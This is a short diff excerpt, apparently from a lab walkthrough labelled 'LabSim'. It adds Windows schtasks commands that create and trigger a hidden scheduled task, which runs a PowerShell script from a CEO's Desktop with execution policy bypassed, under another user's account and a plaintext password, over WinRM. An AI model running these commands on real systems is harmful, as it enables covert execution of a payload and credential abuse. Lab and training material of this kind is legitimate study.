@@ -11,3 +11,6 @@ schtasks /create /tn "LabSim" /tr "powershell.exe -NoProfile -ExecutionPolicy By
 
 Step 5: Trigger the Payload (still in WinRM)
 schtasks /run /tn "LabSim"
+
+2. Create the new task targeting the logged-in user:
+schtasks /create /tn "LabSim" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\CEO\Desktop\run_local.ps1" /sc once /st 00:00 /it /ru "champuser" /rp "champusers_password" /f
